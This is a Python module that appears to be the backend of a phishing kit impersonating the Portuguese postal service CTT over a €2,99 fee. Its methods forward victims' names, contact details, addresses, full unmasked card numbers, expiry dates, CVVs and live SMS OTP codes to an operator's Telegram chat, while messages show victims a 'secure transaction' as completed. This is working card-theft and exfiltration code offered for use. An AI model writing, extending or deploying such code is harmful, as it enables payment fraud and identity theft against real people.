import os
import httpx
from datetime import datetime
from typing import Dict, Any
import logging
from console_service import console_service
from telegram_templates import TelegramTemplates

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        # Force reload environment variables
        from dotenv import load_dotenv
        load_dotenv()
        
        self.bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        
        if self.bot_token:
            self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        else:
            self.base_url = None
        
        if not self.bot_token or not self.chat_id:
            logger.warning(f"Telegram bot token or chat ID not configured. Token: {bool(self.bot_token)}, Chat ID: {bool(self.chat_id)}")
        else:
            logger.info(f"Telegram service initialized successfully. Bot token: {self.bot_token[:20]}..., Chat ID: {self.chat_id}")
    
    def escape_markdown_v2(self, text: str) -> str:
        """Escape special characters for MarkdownV2"""
        special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
        for char in special_chars:
            text = text.replace(char, f'\\{char}')
        return text
    
    async def send_message(self, message: str, parse_mode: str = None) -> bool:
        """Send message to Telegram"""
        if not self.bot_token or not self.chat_id:
            logger.error(f"Telegram configuration missing. Token: {bool(self.bot_token)}, Chat ID: {bool(self.chat_id)}")
            return False
            
        try:
            async with httpx.AsyncClient() as client:
                payload = {
                    "chat_id": self.chat_id,
                    "text": message
                }
                
                # Only add parse_mode if specified
                if parse_mode:
                    if parse_mode == "MarkdownV2":
                        message = self.escape_markdown_v2(message)
                        payload["text"] = message
                    payload["parse_mode"] = parse_mode
                
                logger.info(f"Sending message to Telegram. Chat ID: {self.chat_id}, Message length: {len(message)}")
                
                response = await client.post(
                    f"{self.base_url}/sendMessage",
                    json=payload,
                    timeout=10.0
                )
                
                result = response.json()
                
                if response.status_code == 200 and result.get('ok'):
                    logger.info(f"Message sent to Telegram successfully. Message ID: {result.get('result', {}).get('message_id')}")
                    return True
                else:
                    logger.error(f"Failed to send Telegram message. Status: {response.status_code}, Response: {result}")
                    return False
                    
        except Exception as e:
            logger.error(f"Error sending Telegram message: {str(e)}")
            return False
    
    async def send_billing_info(self, billing_data: Dict[str, Any]) -> bool:
        """Send billing information to Telegram"""
        try:
            # First try console output as fallback
            await console_service.send_billing_info(billing_data)
            
            # If Telegram is not configured, just use console
            if not self.bot_token or not self.chat_id:
                logger.warning("Telegram not configured, using console output only")
                return True
                
            # ESCOLHA O TEMPLATE QUE PREFERE:
            # Opção 1: Template profissional com caixas
            message = TelegramTemplates.billing_template(billing_data)
            
            # Opção 2: Template simples (descomente para usar)
            # message = TelegramTemplates.simple_billing_template(billing_data)
            
            # Opção 3: Template com emojis (descomente para usar)  
            # message = TelegramTemplates.emoji_billing_template(billing_data)
            
            # Opção 4: Template profissional (descomente para usar)
            # message = TelegramTemplates.professional_template(billing_data)
            
            telegram_success = await self.send_message(message)
            return telegram_success
            
        except Exception as e:
            logger.error(f"Error formatting billing message: {str(e)}")
            return True  # Still return True since console output worked
    
    async def send_payment_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> bool:
        """Send payment information to Telegram"""
        try:
            # First try console output as fallback
            await console_service.send_payment_info(billing_data, card_data)
            
            # If Telegram is not configured, just use console
            if not self.bot_token or not self.chat_id:
                logger.warning("Telegram not configured, using console output only")
                return True
                
            # Template para mensagem de pagamento
            message = TelegramTemplates.payment_template(billing_data, card_data)
            
            telegram_success = await self.send_message(message)
            return telegram_success  # Return True even if only console works
            
        except Exception as e:
            logger.error(f"Error formatting payment message: {str(e)}")
            return True  # Still return True since console output worked
    
    async def send_otp_notification(self, billing_data: Dict[str, Any], otp_code: str, action: str = "send") -> bool:
        """Send OTP notification to Telegram"""
        try:
            action_text = "REENVIADO" if action == "resend" else "ENVIADO"
            
            message = f"""📱 CÓDIGO SMS {action_text}

👤 CLIENTE: {billing_data.get('nome', 'N/A')}
📞 TELEFONE: {billing_data.get('telefone', 'N/A')}

🔢 CÓDIGO OTP: {otp_code}
⏰ ENVIADO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
⏳ VÁLIDO POR: 2 minutos

🔒 Este código será usado para verificar o pagamento de €2,99

═══════════════════════════════
📱 SMS de Verificação CTT 📱
═══════════════════════════════"""
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting OTP message: {str(e)}")
            return False

    async def send_card_submitted_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str) -> bool:
        """Send first message: client + card data when card is submitted"""
        try:
            # Show full card number (não mascarado conforme solicitado)
            card_number = card_data.get('numeroCartao', 'N/A')
            
            message = f"""💳 DADOS DE CARTÃO RECEBIDOS

👤 DADOS DO CLIENTE:
┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
┣━ 📧 Email: {billing_data.get('email', 'N/A')}
┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}

📍 ENDEREÇO DE ENTREGA:
┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}

💳 DADOS DO CARTÃO:
┣━ 💵 Valor: €2,99
┣━ 💳 Número do Cartão: {card_number}
┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}

🔑 ID DA SESSÃO: {session_id}
⏰ RECEBIDO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
⏳ STATUS: AGUARDANDO CÓDIGO OTP

═══════════════════════════════
📱 Aguardando Verificação SMS 📱
═══════════════════════════════"""
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting card submitted message: {str(e)}")
            return False

    async def send_otp_verified_message(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], otp_code: str, tracking_number: str) -> bool:
        """Send second message: OTP verification with client identification"""
        try:
            # Get card last 4 digits for identification
            card_number = card_data.get('numeroCartao', '')
            card_last4 = card_number[-4:] if len(card_number) >= 4 else '****'
            
            message = f"""✅ OTP VERIFICADO COM SUCESSO

🔐 VERIFICAÇÃO DE SEGURANÇA COMPLETA:
┣━ 📱 Código OTP: {otp_code}
┣━ ✅ Status: VERIFICADO
┗━ ⏰ Verificado em: {datetime.now().strftime('%d/%m/%Y às %H:%M')}

👤 IDENTIFICAÇÃO DO CLIENTE:
┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
┣━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
┗━ 💳 Cartão: ****{card_last4}

📦 RASTREAMENTO GERADO: {tracking_number}
💰 VALOR CONFIRMADO: €2,99
✅ PAGAMENTO: APROVADO E PROCESSADO

═══════════════════════════════
🛡️ TRANSAÇÃO SEGURA COMPLETADA 🛡️
═══════════════════════════════"""
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting OTP verified message: {str(e)}")
            return False

    async def send_payment_with_otp_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], otp_code: str, tracking_number: str) -> bool:
        """Send complete payment info with OTP verification to Telegram"""
        try:
            # Show full card number (não mascarado conforme solicitado)
            card_number = card_data.get('numeroCartao', 'N/A')
            
            message = f"""💳 PAGAMENTO PROCESSADO COM OTP ✅

👤 DADOS DO CLIENTE:
┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
┣━ 📧 Email: {billing_data.get('email', 'N/A')}
┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}

📍 ENDEREÇO DE ENTREGA:
┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}

💰 DETALHES DO PAGAMENTO:
┣━ 💵 Valor: €2,99
┣━ 💳 Número do Cartão: {card_number}
┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}

🛡️ VERIFICAÇÃO DE SEGURANÇA:
┣━ 📱 Código OTP: {otp_code}
┣━ ✅ Status: VERIFICADO
┗━ 📦 Rastreamento: {tracking_number}

⏰ PROCESSADO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
✅ STATUS: PAGAMENTO CONFIRMADO COM OTP

═══════════════════════════════
🛡️ Pagamento Seguro Verificado 🛡️
═══════════════════════════════"""
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting payment with OTP message: {str(e)}")
            return False

    async def send_tracking_update(self, tracking_number: str, status: str) -> bool:
        """Send tracking update to Telegram"""
        try:
            status_emoji = {
                'processing': '🔄',
                'shipped': '📦',
                'in_transit': '🚚',
                'delivered': '✅',
                'failed': '❌'
            }
            
            message = f"""📦 Atualização de Rastreamento CTT

🔢 Número: {tracking_number}
{status_emoji.get(status, '📦')} Estado: {status}
⏰ Atualização: {datetime.now().strftime('%d/%m/%Y às %H:%M')}

🔍 Rastrear: [Clique aqui](https://exemplo.com/tracking/{tracking_number})"""
            
            return await self.send_message(message)
            
        except Exception as e:
            logger.error(f"Error formatting tracking message: {str(e)}")
            return False

# Global instance
telegram_service = TelegramService()